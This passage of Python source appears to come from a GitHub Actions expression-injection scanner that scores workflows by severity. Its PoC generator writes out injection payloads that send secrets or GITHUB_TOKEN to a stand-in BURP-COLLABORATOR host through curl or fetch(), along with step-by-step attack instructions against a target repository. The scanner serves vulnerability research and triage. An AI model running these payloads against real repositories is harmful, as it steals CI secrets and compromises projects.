    jki = jobs_indent + 2; cur_start = -1; cur_name = ''
    for i in range(jobs_line + 1, len(lines)):
        s = lines[i].strip(); ind = len(lines[i]) - len(lines[i].lstrip())
        if not s or s.startswith('#'): continue
        if ind == jki and s.endswith(':') and not s.startswith('-'):
            if i <= vidx: cur_start = i; cur_name = s.rstrip(':').strip()
            elif cur_start >= 0: break
        if ind < jki and i > jobs_line + 1 and s: break
    return cur_start, cur_name


def find_step_for_line(lines, vidx):
    for i in range(vidx, max(-1, vidx - 50), -1):
        s = lines[i].strip()
        if s.startswith('- name:') or s.startswith('- run:') or s.startswith('- uses:') or s.startswith('- id:'):
            return i
    return -1


def check_disabled(lines, anchor, content_indent):
    if anchor < 0: return False, ''
    for i in range(anchor + 1, min(len(lines), anchor + 20)):
        s = lines[i].strip(); ind = len(lines[i]) - len(lines[i].lstrip())
        if not s or s.startswith('#'): continue
        if ind != content_indent: continue
        if s.startswith('if:'):
            for p in DISABLE_PATS:
                if p.match(s): return True, s
            return False, ''
        if s in ('steps:', 'runs-on:', 'run:', 'run: |', 'uses:'): return False, ''
    return False, ''


def check_job_disabled(lines, job_start):
    if job_start < 0: return False, ''
    jind = len(lines[job_start]) - len(lines[job_start].lstrip())
    return check_disabled(lines, job_start, jind + 2)


def check_step_disabled(lines, step_start):
    if step_start < 0: return False, ''
    sind = len(lines[step_start]) - len(lines[step_start].lstrip())
    return check_disabled(lines, step_start, sind + 2)


def check_auth(content, lines, job_start):
    found = []
    if job_start >= 0:
        jind = len(lines[job_start]) - len(lines[job_start].lstrip())
        job_end = len(lines)
        for i in range(job_start + 1, len(lines)):
            ind = len(lines[i]) - len(lines[i].lstrip())
            s = lines[i].strip()
            if not s or s.startswith('#'): continue
            if ind <= jind and i > job_start: job_end = i; break
        job_content = '\n'.join(lines[job_start:job_end])
    else:
        job_content = content
    for pat in AUTH_PATS:
        m = pat.search(job_content)
        if m: found.append(m.group(0))
    return found


def check_exact_match(lines, vidx, expression):
    expr_clean = expression.strip()
    if expr_clean.startswith('${{') and expr_clean.endswith('}}'):
        expr_clean = expr_clean[3:-2].strip()
    step_start = find_step_for_line(lines, vidx)
    targets = []
    if step_start >= 0:
        targets.append(('step', step_start, len(lines[step_start]) - len(lines[step_start].lstrip()) + 2))
    job_start, _ = find_job_for_line(lines, vidx)
    if job_start >= 0:
        targets.append(('job', job_start, len(lines[job_start]) - len(lines[job_start].lstrip()) + 2))
    for label, anchor, cind in targets:
        for i in range(anchor + 1, min(len(lines), anchor + 20)):
            s = lines[i].strip(); ind = len(lines[i]) - len(lines[i].lstrip())
            if not s or s.startswith('#'): continue
            if ind == cind and s.startswith('if:'):
                esc = re.escape(expr_clean)
                if re.search(esc + r"\s*==\s*'[^']+'", s): return True, s
                if re.search(r"'[^']+'\s*==\s*" + esc, s): return True, s
                if re.search(esc + r'\s*==\s*"[^"]+"', s): return True, s
                if re.search(r'"[^"]+"\s*==\s*' + esc, s): return True, s
                break
            if ind == cind and s in ('steps:', 'runs-on:', 'run:', 'uses:', 'needs:', 'permissions:'):
                continue
            if ind < cind and s: break
    return False, ''


# ── Classification ──

def _is_boolean_result(expr_str):
    inner = expr_str.strip()
    if inner.startswith('${{') and inner.endswith('}}'):
        inner = inner[3:-2].strip()
    if not inner:
        return False
    bare = inner
    while bare.startswith('(') and bare.endswith(')'):
        bare = bare[1:-1].strip()
    if bare.startswith('!'):
        return True
    depth = 0
    i = 0
    while i < len(bare):
        ch = bare[i]
        if ch == '(':
            depth += 1
        elif ch == ')':
            depth -= 1
        elif ch in ("'", '"'):
            q = ch; i += 1
            while i < len(bare) and bare[i] != q:
                i += 1
        elif depth == 0:
            rest = bare[i:]
            if rest.startswith('==') or rest.startswith('!='):
                return True
            if rest.startswith('<=') or rest.startswith('>='):
                return True
            if ch in '<>' and not rest.startswith('<<'):
                return True
        i += 1
    bool_funcs = ('contains(', 'startsWith(', 'endsWith(', 'always(',
                  'failure(', 'success(', 'cancelled(', 'hashFiles(')
    for fn in bool_funcs:
        if bare.startswith(fn):
            return True
    return False


def classify_expression(expr_str):
    expr_str = expr_str.strip()
    if _is_boolean_result(expr_str):
        return 'NO_CONTROL'
    if expr_str.startswith('${{') and expr_str.endswith('}}'):
        expr_str = expr_str[3:-2].strip()
    ternary_m = re.match(
        r".*==\s*'[^']*'\s*&&\s*'[^']*'\s*\|\|\s*'[^']*'$", expr_str)
    if ternary_m: return 'NO_CONTROL'
    parts = [p.strip() for p in expr_str.split('||')]
    levels = []
    for part in parts:
        clean = part.strip().strip("'\"").strip()
        if not clean or re.match(r"^[^a-z]*$", clean) or not re.search(r'github\.|inputs\.', clean):
            if not re.search(r'github\.|inputs\.|steps\.', clean):
                levels.append('NO_CONTROL'); continue
        m = re.match(r'toJSON\((.+)\)', clean)
        if m: clean = m.group(1).strip()
        m = re.match(r'(?:contains|startsWith|endsWith)\(\s*([^,)]+)', clean)
        if m: clean = m.group(1).strip()
        m = re.match(r'format\([^,]+,\s*(.+)\)', clean)
        if m:
            args = [a.strip().strip("'\"") for a in m.group(1).split(',')]
            for a in args:
                if a.startswith('github.') or a.startswith('inputs.'): clean = a; break
        if '&&' in clean:
            rhs = clean.split('&&')[-1].strip().strip("'\"").strip()
            if rhs and not re.search(r'github\.|inputs\.|steps\.', rhs):
                levels.append('NO_CONTROL'); continue
            clean = rhs if rhs else clean
        if re.match(r'(github\.event\.inputs\.[\w-]+|inputs\.[\w-]+)$', clean):
            levels.append('DISPATCH_INPUT'); continue
        if clean in FULL_CONTROL: levels.append('FULL_CONTROL')
        elif clean in LIMITED_CONTROL: levels.append('LIMITED_CONTROL')
        elif clean in NO_CONTROL: levels.append('NO_CONTROL')
        elif any(clean.startswith(p) for p in NO_CONTROL_PREFIXES): levels.append('NO_CONTROL')
        elif clean in PARENT_FULL_CONTROL: levels.append('FULL_CONTROL')
        else:
            matched = False
            for fc in FULL_CONTROL:
                if clean.startswith(fc.rsplit('.', 1)[0] + '.'):
                    levels.append('FULL_CONTROL'); matched = True; break
            if not matched: levels.append('UNKNOWN')
    if 'FULL_CONTROL' in levels: return 'FULL_CONTROL'
    if 'UNKNOWN' in levels: return 'UNKNOWN'
    if 'DISPATCH_INPUT' in levels: return 'DISPATCH_INPUT'
    if 'LIMITED_CONTROL' in levels: return 'LIMITED_CONTROL'
    return 'NO_CONTROL'


def get_trigger_openness(triggers, expression):
    expr_c = expression.strip()
    if expr_c.startswith('${{') and expr_c.endswith('}}'):
        expr_c = expr_c[3:-2].strip()
    required = None
    for key, trigs in EXPR_TRIGGERS.items():
        if key in expr_c: required = trigs; break
    if required is None: required = list(triggers.keys())
    best = 'INTERNAL'
    best_trigger = ''
    for tn in required:
        if tn not in triggers: continue
        types = triggers[tn]
        if not types:
            if tn in OPEN_TYPES:
                return 'OPEN', tn
            elif tn in RESTRICTED_TYPES and best != 'OPEN':
                best = 'RESTRICTED'; best_trigger = tn
            elif tn == 'pull_request' and best == 'INTERNAL':
                best = 'PR_FORK'; best_trigger = tn
            elif tn == 'workflow_dispatch' and best == 'INTERNAL':
                best = 'DISPATCH'; best_trigger = tn
        else:
            ts = set(types)
            if tn in OPEN_TYPES and ts & OPEN_TYPES[tn]:
                return 'OPEN', tn
            if tn in RESTRICTED_TYPES and ts & RESTRICTED_TYPES[tn] and best != 'OPEN':
                best = 'RESTRICTED'; best_trigger = tn
            if tn == 'pull_request' and best == 'INTERNAL':
                best = 'PR_FORK'; best_trigger = tn
    if 'workflow_call' in triggers and best == 'INTERNAL':
        best = 'UNKNOWN_CALLER'; best_trigger = 'workflow_call'
    return best, best_trigger


# ── Expression scanning ──

def _fast_path_check(content):
    checks = ["${{ github.event.", "${{ github.head_ref", "toJSON(github.event",
              "contains(github.event", "startsWith(github.event", "format(",
              "github.event.label.name", "github.event.inputs.", "inputs."]
    return any(c in content for c in checks)


def scan_expressions(content, ctx_map=None):
    if not _fast_path_check(content): return []
    lines = content.split('\n')
    if ctx_map is None: ctx_map = _build_context_map(content)
    results = []
    _any_expr = re.compile(r'\$\{\{.*?\}\}')

    for idx, line in enumerate(lines):
        stripped = line.strip()
        ctx = ctx_map.get(idx)
        if ctx not in ('run', 'script'): continue
        if stripped.startswith('#'): continue

        found_specific = False
        for pat in _COMPILED_DANGEROUS:
            m = pat.search(line)
            if m:
                results.append({"line": idx + 1, "expression": m.group(0),
                    "content": stripped, "context": ctx})
                found_specific = True
                break

        if not found_specific:
            for m in _any_expr.finditer(line):
                expr = m.group(0)
                inner = expr[3:-2].strip()
                if not inner: continue
                if inner.startswith(('hashFiles(', 'runner.', 'job.', 'matrix.',
                                     'strategy.', 'env.', 'secrets.',
                                     'always(', 'failure(', 'success(', 'cancelled(',
                                     'true', 'false', 'null')): continue
                if not any(kw in inner for kw in ('github.', 'steps.', 'needs.', 'inputs.')): continue
                if _is_boolean_result(expr): continue
                ctrl = classify_expression(expr)
                if ctrl in ('FULL_CONTROL', 'LIMITED_CONTROL', 'DISPATCH_INPUT'):
                    results.append({"line": idx + 1, "expression": expr,
                        "content": stripped, "context": ctx})
    return results


# ── Main analysis ──

def analyze(finding):
    content = finding.workflow_content
    lines = content.split('\n')

    finding.triggers = parse_triggers(content)
    finding.secrets_exposed, finding.has_github_token = parse_secrets(content)
    finding.permissions = parse_permissions(content)
    finding.unpinned_actions = find_unpinned_actions(content)
    finding.content_hash = hashlib.sha256(content.encode()).hexdigest()[:16]
    finding.merged_only = check_merged_only(content, finding.triggers)
    finding.permissions_readonly = check_permissions_readonly(content)

    job_boundaries = parse_job_boundaries(lines)
    finding.env_injections = find_env_injections(content, lines)
    finding.indirect_vulns = find_indirect_injections(content, lines)
    ctx_map = _build_context_map(content)
    finding.ai_risk = find_ai_risks(content, lines, ctx_map)
    raw_exprs = scan_expressions(content, ctx_map)

    for vuln in raw_exprs:
        vline = vuln['line']; vexpr = vuln['expression']; vidx = vline - 1
        er = ExprVuln(line=vline, expression=vexpr)
        er.control_level = classify_expression(vexpr)
        er.context = vuln.get('context', ctx_map.get(vidx, 'unknown'))

        if 0 <= vidx < len(lines) and lines[vidx].strip().startswith('#'):
            er.status = 'ELIMINATED'; er.rule = 'R1_COMMENT'; er.reason = 'Commented out'
            finding.eliminated_vulns.append(er); continue

        job_start, job_name = find_job_for_line(lines, vidx)
        dis, dr = check_job_disabled(lines, job_start)
        if dis:
            er.status = 'ELIMINATED'; er.rule = 'R2_JOB_DISABLED'
            er.reason = f'Job "{job_name}" disabled: {dr}'
            finding.eliminated_vulns.append(er); continue

        step_start = find_step_for_line(lines, vidx)
        dis, dr = check_step_disabled(lines, step_start)
        if dis:
            er.status = 'ELIMINATED'; er.rule = 'R3_STEP_DISABLED'
            er.reason = f'Step disabled: {dr}'
            finding.eliminated_vulns.append(er); continue

        required_triggers = None
        expr_clean = vexpr.strip()
        if expr_clean.startswith('${{') and expr_clean.endswith('}}'):
            expr_clean = expr_clean[3:-2].strip()
        for key, trigs in EXPR_TRIGGERS.items():
            if key in expr_clean: required_triggers = trigs; break
        if required_triggers is not None:
            reachable = any(rt in finding.triggers for rt in required_triggers)
            if 'workflow_call' in finding.triggers: reachable = True
            if not reachable:
                er.status = 'ELIMINATED'; er.rule = 'R4_TRIGGER'
                er.reason = f'Needs {required_triggers} but has {list(finding.triggers.keys())}'
                finding.eliminated_vulns.append(er); continue

        if er.context == 'env':
            er.status = 'ELIMINATED'; er.rule = 'R7_ENV'
            er.reason = 'In env: block (not interpolated into shell)'
            finding.eliminated_vulns.append(er); continue

        if er.context == 'with':
            is_github_script = False
            step_s = find_step_for_line(lines, vidx)
            if step_s >= 0:
                for si in range(step_s, min(len(lines), step_s + 5)):
                    if 'github-script' in lines[si]:
                        is_github_script = True; break
            if is_github_script:
                for si in range(vidx, max(-1, vidx - 20), -1):
                    if lines[si].strip().startswith('script:') or lines[si].strip().startswith('script: |'):
                        er.context = 'script'
                        break
                else:
                    er.status = 'ELIMINATED'; er.rule = 'R7c_WITH'
                    er.reason = 'In with: block of github-script (non-script parameter)'
                    finding.eliminated_vulns.append(er); continue
            else:
                er.status = 'ELIMINATED'; er.rule = 'R7c_WITH'
                er.reason = 'In with: block (action input parameter, not shell-interpolated)'
                finding.eliminated_vulns.append(er); continue

        exact, detail = check_exact_match(lines, vidx, vexpr)
        if exact:
            er.status = 'ELIMINATED'; er.rule = 'R7b_EXACT'
            er.reason = f'Exact-match gated: {detail}'
            finding.eliminated_vulns.append(er); continue

        er.echo_only = check_echo_only(lines, vidx)
        er.in_heredoc = check_heredoc_quoted(lines, vidx, vexpr)
        er.status = 'ACTIVE'
        er.reason = f'In {er.context} block, reachable, no gate'
        finding.active_vulns.append(er)

    # ── Build verdict ──
    has_env = len(finding.env_injections) > 0
    has_indirect = len(finding.indirect_vulns) > 0

    if finding.active_vulns and job_boundaries:
        vuln_line = finding.active_vulns[0].line - 1
        vuln_job_start, vuln_job_name = find_job_for_line(lines, vuln_line)
        if vuln_job_name and vuln_job_name in job_boundaries:
            jb = job_boundaries[vuln_job_name]
            job_secrets = parse_secrets_for_job(lines, jb[0], jb[1])
            if set(job_secrets) != set(finding.secrets_exposed):
                finding.secrets_exposed = job_secrets
                downstream = check_job_gated_by_needs(lines, vuln_job_name, job_boundaries)
                ungated_secrets = []
                for dj, dinfo in downstream.items():
                    if not dinfo['gated']:
                        ungated_secrets.extend(dinfo['secrets'])
                if ungated_secrets:
                    finding.secrets_exposed = list(set(job_secrets + ungated_secrets))

    if not finding.active_vulns and not has_env and not has_indirect:
        finding.severity = 'FALSE_POSITIVE'
        if finding.eliminated_vulns:
            finding.explanation = 'All expressions eliminated: ' + '; '.join(
                e.reason for e in finding.eliminated_vulns[:3])
        else:
            finding.explanation = ('No dangerous expressions found in executable contexts '
                                   '(run:/script: blocks). Expressions may exist in safe contexts '
                                   'like env: or name: where they are not interpolated as code.')
        finding.attack_narrative = 'Not exploitable'
        if finding.ai_risk:
            finding.severity = 'AI_INJECTION'
            finding.explanation = ("No direct expression injection, but AI action output "
                "(tainted by attacker input) is used in executable context. "
                "Prompt injection may lead to RCE.")
        return finding

    if finding.active_vulns and all(e.control_level == 'NO_CONTROL' for e in finding.active_vulns):
        if not has_env and not has_indirect:
            finding.severity = 'FALSE_POSITIVE'
            finding.explanation = 'All active expressions have no attacker control'
            finding.attack_narrative = 'Not attacker-controllable'
            if finding.ai_risk:
                finding.severity = 'AI_INJECTION'
                finding.explanation = ("No direct expression injection, but AI action output "
                    "(tainted by attacker input) is used in executable context. "
                    "Prompt injection may lead to RCE.")
            return finding

    best_openness = 'INTERNAL'; best_trigger = ''
    for av in finding.active_vulns:
        o, t = get_trigger_openness(finding.triggers, av.expression)
        if o == 'OPEN': best_openness = 'OPEN'; best_trigger = t; break
        if o in ('RESTRICTED', 'PR_FORK', 'UNKNOWN_CALLER', 'DISPATCH') and best_openness == 'INTERNAL':
            best_openness = o; best_trigger = t
    finding.trigger_openness = best_openness

    desc_tpl = _OPENNESS_DESC.get(best_openness, '{trigger}')
    trig_display = best_trigger or ', '.join(list(finding.triggers.keys())[:2])
    finding.who_can_trigger = desc_tpl.format(trigger=trig_display)

    if finding.active_vulns:
        auth_found = check_auth(content, lines,
                                find_job_for_line(lines, finding.active_vulns[0].line - 1)[0])
        finding.has_auth_check = len(auth_found) > 0
        finding.auth_details = '; '.join(auth_found)

    has_custom = len(finding.secrets_exposed) > 0
    has_full = any(e.control_level in ('FULL_CONTROL', 'UNKNOWN') for e in finding.active_vulns)
    head_ref_only = (finding.active_vulns and
                     all(e.control_level == 'LIMITED_CONTROL' for e in finding.active_vulns))
    dispatch_only = (finding.active_vulns and
                     all(e.control_level == 'DISPATCH_INPUT' for e in finding.active_vulns))
    finding.has_echo_only = (finding.active_vulns and
                             all(e.echo_only for e in finding.active_vulns))
    finding.has_heredoc_only = (finding.active_vulns and
                                all(e.in_heredoc for e in finding.active_vulns))

    perms = finding.permissions
    has_write_perms = (not perms or perms.get('_workflow') == 'write-all' or
                       any(v == 'write' for k, v in perms.items() if k != '_workflow'))

    merged_note = (' Merged-only gate detected (PR title set before merge — still exploitable '
                   'but requires maintainer action).') if finding.merged_only else ''
    echo_note = (' Expression in echo-only command (still RCE via $() subshell).'
                 ) if finding.has_echo_only else ''
    heredoc_note = (' Expression inside quoted heredoc (<< \'DELIM\') — shell expansion disabled. '
                    'Exploitation requires toJSON() to produce an isolated delimiter line, '
                    'which is nearly impossible with JSON-structured output. Severity reduced.'
                    ) if finding.has_heredoc_only else ''
    perms_note = (' Workflow has permissions: {} (GITHUB_TOKEN has no permissions). '
                  'Even with RCE, GITHUB_TOKEN cannot read/write repo, packages, or actions.'
                  ) if finding.permissions_readonly else ''
    extra = merged_note + echo_note + heredoc_note + perms_note

    if head_ref_only and not has_env:
        finding.severity = 'LOW'
        finding.explanation = 'Only head_ref/label expressions (limited charset).' + extra
    elif dispatch_only and not has_env:
        finding.severity = 'MEDIUM' if has_custom else 'LOW'
        finding.explanation = (
            f'workflow_dispatch input injection. Requires collaborator access. '
            f'{"Custom secrets: " + ", ".join(finding.secrets_exposed[:3]) + "." if has_custom else "No custom secrets."}'
            + extra)
    elif best_openness == 'OPEN' and has_full and has_custom and not finding.has_auth_check:
        finding.severity = 'CRITICAL'
        ctx_name = finding.active_vulns[0].context if finding.active_vulns else 'run'
        secrets_str = ', '.join(finding.secrets_exposed[:5])
        finding.explanation = (
            f'Expression injection into {ctx_name}: block via attacker-controlled input. '
            f'Trigger {best_trigger} is open to all GitHub users. '
            f'No authorization check. Custom secrets: {secrets_str}.' + extra)
    elif best_openness == 'OPEN' and has_full and not finding.has_auth_check:
        finding.severity = 'HIGH'
        finding.explanation = (
            f'Expression injection via attacker-controlled input. '
            f'Trigger {best_trigger} open to all. No auth check. '
            f'GITHUB_TOKEN only — can modify repo, create releases, pivot.' + extra)
    elif finding.has_auth_check and has_custom:
        finding.severity = 'MEDIUM'
        finding.explanation = (
            f'Auth check ({finding.auth_details}) + custom secrets present. '
            f'Some auth checks are bypassable — verify manually.' + extra)
    elif best_openness == 'RESTRICTED' and has_custom:
        finding.severity = 'MEDIUM'
        finding.explanation = (
            f'Trigger {best_trigger} requires specific permissions. '
            f'Custom secrets: {", ".join(finding.secrets_exposed[:3])}.' + extra)
    elif finding.has_auth_check:
        finding.severity = 'MEDIUM'
        finding.explanation = f'Auth check: {finding.auth_details}. Verify manually.' + extra
    elif best_openness in ('INTERNAL', 'PR_FORK'):
        finding.severity = 'LOW'
        finding.explanation = f'Trigger {best_openness} limits exploitability.' + extra
    elif best_openness == 'UNKNOWN_CALLER':
        finding.severity = 'MEDIUM' if has_custom else 'LOW'
        finding.explanation = 'Reusable workflow — depends on caller permissions.' + extra
    else:
        finding.severity = 'MEDIUM'; finding.confidence = 'LOW'
        finding.explanation = 'Uncertain — review manually.' + extra

    if finding.has_heredoc_only and finding.severity in ('CRITICAL', 'HIGH'):
        finding.severity = 'MEDIUM' if finding.severity == 'CRITICAL' else 'LOW'

    if finding.permissions_readonly and not has_custom:
        if finding.severity == 'CRITICAL': finding.severity = 'MEDIUM'
        elif finding.severity == 'HIGH': finding.severity = 'LOW'
        elif finding.severity == 'MEDIUM': finding.severity = 'LOW'

    if has_env and finding.severity in ('LOW', 'FALSE_POSITIVE'):
        finding.severity = 'MEDIUM'
        env_types = ', '.join(set(e['type'] for e in finding.env_injections))
        finding.explanation += f' {env_types} injection detected (persists across steps).'

    if has_indirect and finding.severity in ('LOW', 'FALSE_POSITIVE'):
        finding.severity = 'MEDIUM'
        finding.explanation += ' Indirect injection via step outputs detected.'

    ctrls = [e for e in finding.active_vulns if e.control_level in ('FULL_CONTROL', 'UNKNOWN')]
    if ctrls:
        e = ctrls[0]
        finding.attack_narrative = f'Inject via {e.expression} in {e.context}: block'
        if has_custom:
            finding.attack_narrative += f' → exfiltrate {", ".join(finding.secrets_exposed[:3])}'
        elif has_write_perms:
            finding.attack_narrative += ' → modify repo / create release'
    elif finding.env_injections:
        e = finding.env_injections[0]
        finding.attack_narrative = f'{e["type"]} injection via {e["expression"]} → persists across steps'
    elif finding.indirect_vulns:
        finding.attack_narrative = f'Indirect injection via step output → {finding.indirect_vulns[0]["expression"]}'
    elif dispatch_only:
        finding.attack_narrative = 'workflow_dispatch input injection (requires collaborator)'
    else:
        finding.attack_narrative = 'Limited injection capability'

    if finding.severity in ('CRITICAL', 'HIGH'):
        finding.poc = _generate_poc(finding, has_custom, has_write_perms)

    if hasattr(finding, '_other_workflows') and finding._other_workflows:
        _cross_workflow_analysis(finding)

    if hasattr(finding, '_clone_path') and finding._clone_path:
        _local_action_analysis(finding, lines)

    return finding


def _cross_workflow_analysis(finding):
    notes = []
    wf_name = ''
    if HAS_YAML:
        try:
            p = yaml.safe_load(finding.workflow_content)
            if p and isinstance(p, dict):
                wf_name = p.get('name', '')
        except: pass

    for wf_path, wf_content in finding._other_workflows.items():
        if not wf_content: continue
        if 'workflow_run' in wf_content:
            if HAS_YAML:
                try:
                    p = yaml.safe_load(wf_content)
                    if p and isinstance(p, dict):
                        on = p.get(True) or p.get('on') or {}
                        if isinstance(on, dict) and 'workflow_run' in on:
                            wr = on['workflow_run']
                            workflows = wr.get('workflows', []) if isinstance(wr, dict) else []
                            if wf_name and wf_name in workflows:
                                wf_secrets = []
                                for line in wf_content.split('\n'):
                                    for m in re.finditer(r'secrets\.([A-Za-z_]\w*)', line):
                                        s = m.group(1)
                                        if s != 'GITHUB_TOKEN':
                                            wf_secrets.append(s)
                                wf_secrets = sorted(set(wf_secrets))
                                if wf_secrets:
                                    notes.append(
                                        f'⚠ workflow_run chain: {wf_path} triggers on this workflow '
                                        f'and has secrets: {", ".join(wf_secrets[:3])}. '
                                        f'May enable privilege escalation.'
                                    )
                except: pass

        for trig in finding.triggers:
            if trig in wf_content and trig in ('issue_comment', 'pull_request_target'):
                if any(kw in wf_content.lower() for kw in ['membership', 'author_association', 'access denied', 'unauthorized']):
                    notes.append(
                        f'ℹ {wf_path} also triggers on {trig} and may contain auth checks'
                    )

    if notes:
        finding.explanation += ' | Cross-workflow: ' + ' | '.join(notes)


def _local_action_analysis(finding, lines):
    clone_path = finding._clone_path
    if not clone_path: return

    local_actions_used = []
    for line in lines:
        m = re.match(r'\s*uses:\s*\./(\.github/actions/[^\s@]+)', line.strip())
        if m:
            local_actions_used.append(m.group(1))

    if not local_actions_used: return

    notes = []
    for action_path in local_actions_used:
        action_yml = os.path.join(clone_path, action_path, 'action.yml')
        if not os.path.isfile(action_yml):
            action_yml = os.path.join(clone_path, action_path, 'action.yaml')
        if os.path.isfile(action_yml):
            try:
                with open(action_yml, 'r', encoding='utf-8', errors='replace') as f:
                    action_content = f.read()
                if 'run:' in action_content:
                    for fc in FULL_CONTROL:
                        if fc in action_content:
                            notes.append(
                                f'⚠ Local action {action_path} contains run: blocks with {fc}'
                            )
                            break
            except: pass

    if notes:
        finding.explanation += ' | Local actions: ' + ' | '.join(notes)


def _generate_poc(finding, has_custom, has_write_perms):
    if finding.severity == 'FALSE_POSITIVE':
        return ''
    best = None
    for e in finding.active_vulns:
        if e.control_level == 'FULL_CONTROL':
            best = e; break
    if not best and finding.active_vulns:
        best = finding.active_vulns[0]
    if not best:
        return ''

    expr = best.expression.strip()
    if expr.startswith('${{'):
        inner = expr[3:-2].strip()
    else:
        inner = expr
    ctx = best.context
    repo = finding.repo

    exfil_target = ''
    if has_custom:
        first_secret = finding.secrets_exposed[0]
        exfil_target = first_secret
    elif has_write_perms and not finding.permissions_readonly:
        exfil_target = 'GITHUB_TOKEN'

    if ctx == 'script':
        if exfil_target:
            payload = (f"'}});\n"
                       f"const s=process.env.{exfil_target}||process.env.GITHUB_TOKEN;\n"
                       f"fetch('https://BURP-COLLABORATOR/'+btoa(s));//")
        else:
            payload = "'});require('child_process').execSync('id > /tmp/pwned');//"
    else:
        if exfil_target:
            payload = f'"; curl https://BURP-COLLABORATOR/$(echo ${exfil_target} | base64 -w0) #'
        else:
            payload = '"; id #'

    steps = []
    steps.append(f'TARGET: {repo}')
    steps.append(f'VULN:   L{best.line} — {expr} in {ctx}: block')
    steps.append('')

    if 'comment.body' in inner:
        if 'pull_request_review_comment' in str(finding.triggers):
            steps.append('1. Go to any open Pull Request on the repo')
            steps.append('2. Submit a PR review comment containing the payload:')
        else:
            steps.append('1. Go to any open Issue on the repo (or create one)')
            steps.append('2. Post a comment containing the payload:')
        steps.append('')
        steps.append(f'   {payload}')
    elif 'issue.title' in inner:
        steps.append('1. Create a new Issue with a malicious title:')
        steps.append('')
        steps.append(f'   Title: {payload}')
    elif 'issue.body' in inner:
        steps.append('1. Create a new Issue with a malicious body:')
        steps.append('')
        steps.append(f'   Body: {payload}')
    elif 'pull_request.title' in inner:
        steps.append('1. Fork the repository')
        steps.append('2. Create a branch with any change')
        steps.append('3. Open a Pull Request with a malicious title:')
        steps.append('')
        steps.append(f'   Title: {payload}')
    elif 'pull_request.body' in inner:
        steps.append('1. Fork the repository')
        steps.append('2. Create a branch with any change')
        steps.append('3. Open a Pull Request with a malicious body:')
        steps.append('')
        steps.append(f'   Body: {payload}')
    elif 'review.body' in inner:
        steps.append('1. Go to any open Pull Request')
        steps.append('2. Submit a review with a malicious body:')
        steps.append('')
        steps.append(f'   Review body: {payload}')
    elif 'head_ref' in inner or 'head.ref' in inner:
        steps.append('1. Fork the repository')
        steps.append('2. Create a branch with a malicious name (limited charset):')
        steps.append('')
        steps.append(f'   git checkout -b "injection-$(id)"')
        steps.append('3. Open a Pull Request from that branch')
    elif 'discussion.title' in inner:
        steps.append('1. Go to Discussions tab and create a new discussion')
        steps.append('2. Use a malicious title:')
        steps.append('')
        steps.append(f'   Title: {payload}')
    elif 'discussion.body' in inner:
        steps.append('1. Go to Discussions tab and create a new discussion')
        steps.append('2. Use a malicious body:')
        steps.append('')
        steps.append(f'   Body: {payload}')
    elif 'label.name' in inner:
        steps.append('1. (Requires triage/write access) Add a label with a malicious name')
        steps.append('')
        steps.append(f'   Label: {payload}')
    elif 'inputs.' in inner or 'event.inputs.' in inner:
        input_name = re.search(r'inputs\.([\w-]+)', inner)
        iname = input_name.group(1) if input_name else 'INPUT'
        steps.append('1. (Requires collaborator access) Go to Actions tab')
        steps.append(f'2. Select the workflow and click "Run workflow"')
        steps.append(f'3. Set input "{iname}" to:')
        steps.append('')
        steps.append(f'   {payload}')
    elif 'toJSON(github.event' in inner:
        if 'issue_comment' in str(finding.triggers):
            steps.append('1. Go to any open Issue (or create one)')
            steps.append("2. Post a comment containing a single quote (') to break echo:")
            steps.append('')
            if exfil_target:
                steps.append(f"   '; curl https://BURP-COLLABORATOR/$(echo ${exfil_target} | base64) #")
            else:
                steps.append("   '; id > /tmp/pwned #")
        elif 'issues' in str(finding.triggers):
            steps.append('1. Create an Issue with a single quote in the title:')
            steps.append('')
            steps.append(f"   Title: test' ; id #")
        else:
            steps.append('1. Trigger the workflow via the relevant event')
            steps.append(f'2. Include payload in the attacker-controlled field')
    else:
        steps.append('1. Trigger the workflow via the relevant event')
        steps.append(f'2. Inject the payload into: {inner}')
        steps.append('')
        steps.append(f'   Payload: {payload}')

    steps.append('')
    steps.append('3. Wait for the workflow to execute (check Actions tab)')

    if exfil_target:
        steps.append(f'4. Check your Burp Collaborator / webhook for the exfiltrated {exfil_target}')
    else:
        steps.append('4. Verify RCE in the workflow logs (Actions tab)')

    if finding.merged_only:
        steps.append('')
        steps.append('NOTE: Workflow has merged-only gate — PR must be merged first')
    if finding.has_auth_check:
        steps.append('')
        steps.append(f'NOTE: Auth check present ({finding.auth_details}) — may block exploitation')
    if finding.trigger_openness == 'RESTRICTED':
        steps.append('')
        steps.append(f'NOTE: Trigger is restricted — {finding.who_can_trigger}')

    return '\n'.join(steps)


def analyze_offline_finding(raw_finding):
    f = Finding(
        repo=raw_finding['repo'], path=raw_finding['path'],
        stars=raw_finding.get('stars', 0),
        repo_url=raw_finding.get('repo_url', f"https://github.com/{raw_finding['repo']}"),
        file_url=raw_finding.get('url', ''),
        security_url=raw_finding.get('security_url', ''),
        workflow_content=raw_finding.get('workflow_content', ''),
        query_id=raw_finding.get('query_id', -1),
        query_name=raw_finding.get('query_name', ''))
    owner = f.repo.split('/')[0]
    f.org_name = owner; f.org_type = 'Unknown'
    if not f.file_url: f.file_url = f"https://github.com/{f.repo}/blob/HEAD/{f.path}"
    if not f.security_url: f.security_url = f"https://github.com/{f.repo}/security"
    return analyze(f)


# ════════════════════════════════════════════════════════════════════
#  PHASE 4: REPORTING (import from reports module or inline)
# ════════════════════════════════════════════════════════════════════

# For now, reporting functions are included inline to keep backward compat.
# Future refactor: move to gha_vuln_scanner.reports

def finding_to_dict(f):
    return {
        "severity": f.severity, "confidence": f.confidence, "stars": f.stars,
        "repo": f.repo, "org_name": f.org_name, "org_type": f.org_type,
        "repo_url": f.repo_url, "file_url": f.file_url, "security_url": f.security_url,
        "who_can_trigger": f.who_can_trigger, "explanation": f.explanation,
        "secrets_exposed": f.secrets_exposed, "permissions": f.permissions,
        "triggers": f.triggers, "trigger_openness": f.trigger_openness,
        "has_auth_check": f.has_auth_check, "auth_details": f.auth_details,
        "merged_only": f.merged_only, "echo_only": f.has_echo_only,
        "heredoc_only": f.has_heredoc_only, "permissions_readonly": f.permissions_readonly,
        "attack_narrative": f.attack_narrative,
        "poc": f.poc,
        "ai_risk": f.ai_risk,
        "vulnerable_expressions": [
            {"line": e.line, "expression": e.expression, "context": e.context,
             "control": e.control_level, "control_label": ctrl_label(e.control_level),
             "control_desc": ctrl_explain(e.control_level), "echo_only": e.echo_only,
             "in_heredoc": e.in_heredoc}
            for e in f.active_vulns],
        "eliminated_expressions": [
            {"line": e.line, "expression": e.expression, "rule": e.rule, "reason": e.reason}
